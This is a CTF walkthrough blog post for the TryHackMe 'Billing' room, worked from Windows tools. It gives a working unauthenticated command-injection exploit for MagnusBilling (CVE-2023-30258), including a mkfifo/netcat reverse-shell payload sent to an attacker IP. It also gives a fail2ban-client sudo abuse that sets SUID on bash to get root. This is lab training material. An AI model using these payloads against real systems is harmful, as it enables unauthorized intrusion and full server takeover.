---
layout: post
title: "Billing - TryHackMe Walkthrough"
date: 2025-04-27
categories: [writeup]
tags: [TryHackMe, CTF, PowerHack, Windows, PowerShell, Enumeration, ReverseShell]
image: /assets/img/billing/billing.png
---

> 💻 **PowerHack Series**  
This write-up is part of my *PowerHack* series — a personal initiative to solve [TryHackMe CTFs](https://tryhackme.com/hacktivities/challenges) using only **Windows-based tools**.  
From PowerShell to WSL, I'm proving that ethical hacking can be done effectively without leaving your Windows workstation.

![PowerHack Logga](/assets/img/powerhack.png)

# Billing - TryHackMe Walkthrough

> Gain a shell, find a way, and escalate privileges. Bruteforcing is out of scope. [TryHackMe](https://tryhackme.com/room/billing).

---

# 🔍 1. Initial Recon

We begin by scanning the target using Nmap to discover open ports, services, and potential entry points.

Since this walkthrough is focused on Hacking from Windows, we use WSL (Windows Subsystem for Linux) to run Linux tools like Nmap directly on our Windows machine.
WSL provides a lightweight Linux environment integrated into Windows without the need for a full virtual machine, making it perfect for Windows-based penetration testing workflows.

```bash
wsl nmap -sC -sV -Pn -p- <TARGET-IP> -oN billing-fullscan.txt
```

**Flags explained:**
- `wsl` — tells Windows to run the command inside the WSL environment.
- `-sC` — Run default scripts.
- `-sV` — Probe services to determine versions.
- `-Pn` — Treat all hosts as online (skip ping).
- `-p-` — Scan all 65,535 ports.
- `-oN` — Output scan results to a file.

By doing full recon early, we avoid missing hidden or unusual services running on non-standard ports.

### ✨ Key Open Ports Discovered:
- **22/tcp** — OpenSSH 8.4 (SSH service)
- **80/tcp** — Apache 2.4.56 (Web server)
- **3306/tcp** — MariaDB (Database service)
- **5038/tcp** — Asterisk Call Manager (VoIP application)

```powershell
wsl nmap -sC -sV -Pn -p- 10.10.81.237
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 11:34 CEST
Nmap scan report for 10.10.81.237
Host is up (0.050s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling
|_Requested resource was http://10.10.81.237/mbilling/
| http-robots.txt: 1 disallowed entry
|_/mbilling/
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.64 seconds

```

### Discovery Scanning

After identifying a web service running on port 80, we perform directory enumeration to uncover hidden files and directories that may not be linked publicly.

Since we are hacking from Windows, we use Gobuster through PowerShell:

```powershell
gobuster dir -u http://10.10.81.237/mbilling/ -w C:\Temp\wordlists\common.txt -t 50
```

Command breakdown:

gobuster dir — run Gobuster in directory enumeration mode.

- `u` — specify the target URL.

- `w` — provide a wordlist of common directory names to brute-force.

- `t 50` — use 50 threads for faster scanning (be cautious not to overload the server).

**Note:** Always adjust the number of threads based on the environment. 50 threads are aggressive but acceptable for CTF environments like TryHackMe.

**Scan Results:**

```powershell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.237/mbilling/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                C:\Temp\wordlists\common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE              (Status: 200) [Size: 7652]
/akeeba.backend.log   (Status: 403) [Size: 277]
/archive              (Status: 301) [Size: 323] [--> http://10.10.81.237/mbilling/archive/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.81.237/mbilling/assets/]
/development.log      (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/fpdf                 (Status: 301) [Size: 320] [--> http://10.10.81.237/mbilling/fpdf/]
/index.html           (Status: 200) [Size: 30760]
/index.php            (Status: 200) [Size: 663]
/lib                  (Status: 301) [Size: 319] [--> http://10.10.81.237/mbilling/lib/]
/production.log       (Status: 403) [Size: 277]
/protected            (Status: 403) [Size: 277]
/resources            (Status: 301) [Size: 325] [--> http://10.10.81.237/mbilling/resources/]
/README.md            (Status: 200) [Size: 1995]
/spamlog.log          (Status: 403) [Size: 277]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.81.237/mbilling/tmp/]
Progress: 4748 / 4748 (100.00%)
===============================================================
Finished
===============================================================
```

**Important Finding:**
- The file /mbilling/README.md was discovered during this scan.
- Visiting the README file revealed that the site was running MagnusBilling v7.

### 🔎 Web Recon:
Browsing to `http://<TARGET-IP>/mbilling/` shows a web app named **MagnusBilling**.

Found file `README.md` reveals version **MagnusBilling v7**.

---

# 🛡️ 2. CVE Lookup

Using our **PowerHack-CVE.ps1** script to search for known vulnerabilities related to MagnusBilling:

```powershell
PowerHack-CVE.ps1 -Query "MagnusBilling" -ExportHtml reportCVE.html
```



**CVE Source:**  [CVE-2023-30258](https://vulners.com/id/CVE-2023-30258)

![PowerHack CVE-2023-30258 Screenshot](/assets/img/billing/PowerHackCVE.png)

**Result:**
- **CVE-2023-30258** — *Unauthenticated Command Injection* vulnerability in MagnusBilling versions 6.x and 7.x.

✅ This vulnerability is **exactly** what we need to exploit!

---

# 🎯 3. Discovery of Command Injection

Testing if the application is vulnerable to command injection by sending a sleep payload:

```powershell
$start = Get-Date
Invoke-WebRequest -Uri "http://<TARGET-IP>/mbilling/lib/icepay/icepay.php?democ=;sleep+2;" -UseBasicParsing > $null
$end = Get-Date
Write-Host "Sleep 2 duration: $($end - $start)"
```

**Result:**
- Noticeable time delay ✅ confirming the injection point!


---

# 🔥 4. Gaining a Reverse Shell

Setting up a reverse shell using the confirmed injection vulnerability.

```powershell
$ip = "YOUR-IP"
$port = 4444
$payload = ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $ip $port >/tmp/f;"
$encoded = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest -Uri "http://<TARGET-IP>/mbilling/lib/icepay/icepay.php?democ=$encoded" -UseBasicParsing
```

**Listener:**
```powershell
ncat.exe -lvnp 4444
```

Result: **Reverse shell acquired** as low-privileged user.

To improve shell run

```powershell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```

---

# 🧹 5. Enumeration & Finding the User Flag

Navigate through the system to find `user.txt`:

```bash
cd /home/magnus
cat user.txt
```

```bash
cd /home/magnus
asterisk@Billing:/home/magnus$ ls -l
ls -l
total 36
drwx------ 2 magnus magnus 4096 Mar 27  2024 Desktop
drwx------ 2 magnus magnus 4096 Mar 27  2024 Documents
drwx------ 2 magnus magnus 4096 Mar 27  2024 Downloads
drwx------ 2 magnus magnus 4096 Mar 27  2024 Music
drwx------ 2 magnus magnus 4096 Mar 27  2024 Pictures
drwx------ 2 magnus magnus 4096 Mar 27  2024 Public
drwx------ 2 magnus magnus 4096 Mar 27  2024 Templates
drwx------ 2 magnus magnus 4096 Mar 27  2024 Videos
-rw-r--r-- 1 magnus magnus   38 Mar 27  2024 user.txt
asterisk@Billing:/home/magnus$
```

✅ Successfully retrieved the user flag!

---

# 🚀 6. Privilege Escalation via Fail2Ban

During enumeration, we discovered that the asterisk user has passwordless sudo access to the fail2ban-client binary:

### 🛡️ 6.1 Checking Sudo Permissions

We check what commands we can run with sudo:

```bash
sudo -l
```

**Output:**
```bash
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
asterisk@Billing:/home/magnus$
```

**Explanation:**

This is a critical misconfiguration — fail2ban-client can run arbitrary actions as root, depending on how we manipulate it.

- We have passwordless sudo access to the `fail2ban-client` utility.
- `fail2ban-client` allows configuring actions dynamically — including running system commands!

### 💥 6.2 Abusing Fail2Ban to Set the SUID Bit on Bash
**Goal:** Make /bin/bash a SUID binary, allowing us to spawn a root shell.

We exploit `fail2ban-client` to modify the iptables action and **set the SUID bit** on `/bin/bash`, allowing us to spawn a privileged shell.

**Commands:**

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```
**Explanation:**

- We modify the actionban command for the Asterisk fail2ban jail.
- Instead of blocking IPs, it now runs chmod +s /bin/bash, setting the SUID bit on the Bash binary.

**Output**
```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
<es-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
asterisk@Billing:/home/magnus$
```
✅ Successfully injected our malicious action!

### 🎯 6.2 Triggering the Modified Action
Now we need to trigger the action by simulating a ban on an arbitrary IP address:

**Command**

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
```
**Explanation:**
- We modify the action to **run `chmod +s /bin/bash`**.
- Trigger a "ban" by setting a fake IP.
- The SUID bit will allow **anyone** running `/bin/bash` to execute with **root privileges**.

**Output**

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
<fail2ban-client set asterisk-iptables banip 1.2.3.4
1
asterisk@Billing:/home/magnus$
```

✅ The action was successfully triggered.

### 🔎 6.3 Confirm Bash is Now SUID
Let's check if the SUID bit was set correctly on /bin/bash:

```bash
ls -l /bin/bash
```

Expected output:
```
-rwsr-sr-x 1 root root 123456 /bin/bash
```
✅ The `s` in the user permissions (rws) confirms that **SUID** is active — meaning Bash will execute with root privileges regardless of the user running it.


### 👑 6.4 Spawn a Root Shell

Now, we can spawn a root shell using the modified Bash:

```bash
/bin/bash -p
```

**Output**
```bash
/bin/bash -p
bash-5.1#
```
Note: The -p flag tells Bash to preserve privileges, preventing it from dropping root privileges.

### 🎯 6.5 Improve the Shell
Although we have root, the terminal might feel unstable (missing features like tab completion).
We can upgrade it to a proper TTY shell:

```bash
python3 -c 'import os;import pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
```
**Result in a Bash shell:**

```bash
bash-5.1# python3 -c 'import os;import pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
<os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
root@Billing:/home/magnus#
```
✅ **Now we have a fully functional root shell!**

---

# 🏆 7. Retrieving the Root Flag

With full root access, we can now easily retrieve the final flag.

List files in /root:
```bash
ls -l /root
```

**Output**
```bash
ls -l /root
total 12
-rw-r--r-- 1 root root  1 Mar 31  2024 filename
-rw-r--r-- 1 root root 17 Mar 27  2024 passwordMysql.log
-rw-r--r-- 1 root root 38 Mar 27  2024 root.txt
root@Billing:/home/magnus#
```
**Now grab the root.txt**

```bash
cat /root/root.txt
```

✅ **Root flag captured! Billing CTF successfully completed!**


---

# 📜 Completion Summary

- ✅ Performed initial recon with Nmap and web discovery.
- ✅ Identified a Command Injection vulnerability (CVE-2023-30258).
- ✅ Gained a reverse shell using crafted payloads.
- ✅ Escalated privileges by abusing `fail2ban-client`.
- ✅ Captured both `user.txt` and `root.txt` flags.

---

> 🖥️ **This write-up demonstrates Hacking from Windows techniques using PowerShell, WSL, and custom tools from the PowerHack arsenal.**

> 🚀 **Join the PowerHack journey: hacking smarter, faster — directly from Windows!**

---
